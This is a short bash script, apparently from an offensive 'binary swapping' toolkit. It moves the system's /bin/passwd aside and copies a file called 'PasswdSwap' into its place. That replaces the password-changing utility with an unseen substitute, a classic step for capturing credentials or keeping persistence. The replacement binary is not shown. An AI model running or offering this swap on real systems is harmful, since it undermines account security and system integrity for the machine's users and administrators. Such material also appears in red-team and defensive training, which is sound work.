#!/bin/bash

if [ -e "/bin/passwd" ]; then
    mv /bin/passwd /bin/passwd.bak
    cp Linux/BianarySwapping/PasswdSwap /bin/passwd
else
    echo "Bianary not present on system."
fi
